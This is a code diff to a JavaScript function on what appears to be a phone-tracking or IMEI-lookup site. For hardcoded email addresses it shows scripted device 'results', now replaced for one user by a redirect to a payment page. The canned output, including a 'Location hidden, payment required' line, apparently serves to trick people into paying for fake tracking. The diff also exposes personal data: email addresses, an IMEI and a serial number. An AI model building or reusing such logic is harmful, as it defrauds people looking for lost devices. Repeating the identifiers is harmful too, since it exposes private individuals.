@@ -42,14 +42,7 @@ function feedBack(){
     }
  if (username=="ashrafprofessor30@gmail.com"){
             
-            phoneImageLay.style.display=("block");
-            phoneImage.src = "https://www.imei.info/media/t/gsm-cache/Q/9/B5fkgh-d/samsung-galaxy-a04e.jpg";
-        
-        mainInfo.innerHTML=("STATUS: <font color=#00ee00>Found</font><br/>IMEI: <font color=#00ee00> 354757356852670</font><br/>  Model: Galaxy A04e (SM-A042F)<br/>Brand: Samsung<br/>DeviceType:  Smartphone<br/>  Location: <font color=#ff0000>  Hidden(Payment Required)</font><br/>  Country Code: BW<br/>  Country Name: Botswana ");
-        moreInfo.innerHTML=(" Model Info: MOBILE SM-A042F/DS AFC<br/>Search Term: 354757356852670<br/>IMEI 1: 354757356852670<br/>Serial Number:<font color=#ff0000> R8YWA0A8HWT</font><br/>Model Desc: Samsung A04e<br/>Model Name: SM-A042F/DS<br/>Model Number: SM-A042FZCDAFC<br/>Warranty Status: Warranty Active<br/>Estimated Warranty End Date: 09-10-2025<br/>Production location: Korea SEC<br/>Production Date: 09-10-2023 ");
-        
-        mainInfo.style.display=("block");
-        moreInfo.style.display=("block");   
+            window.location.href=("paymentRequired.html");  
 
     }
 if (username=="segotsoreuben@gmail.com"){
